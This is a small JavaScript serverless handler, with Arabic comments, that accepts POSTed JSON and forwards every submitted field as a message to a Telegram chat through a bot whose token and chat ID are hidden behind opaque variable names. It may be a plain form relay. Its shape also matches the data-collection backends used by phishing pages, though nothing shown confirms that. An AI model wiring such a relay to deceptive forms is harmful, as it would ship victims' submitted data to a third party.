export default {
  async fetch(request, env) {
    if (request.method !== 'POST') {
      return new Response('Only POST allowed', { status: 405 });
    }

    try {
      const data = await request.json();

      // حوّل كل الحقول إلى نص مرتب
      let message = "📩 بيانات جديدة:\n";
      for (const [key, value] of Object.entries(data)) {
        message += `${key}: ${value}\n`;
      }

      // أرسل الرسالة إلى تلغرام
      const telegramURL = `https://api.telegram.org/bot${env.AB}/sendMessage`;
      const payload = {
        chat_id: env.BC,
        text: message,
        parse_mode: 'Markdown'
      };

      const telegramResponse = await fetch(telegramURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (!telegramResponse.ok) {
        throw new Error(`Telegram API error: ${telegramResponse.statusText}`);
      }

      return new Response('تم الإرسال بنجاح', { status: 200 });
    } catch (err) {
      return new Response(`خطأ: ${err.message}`, { status: 500 });
    }
  }
};
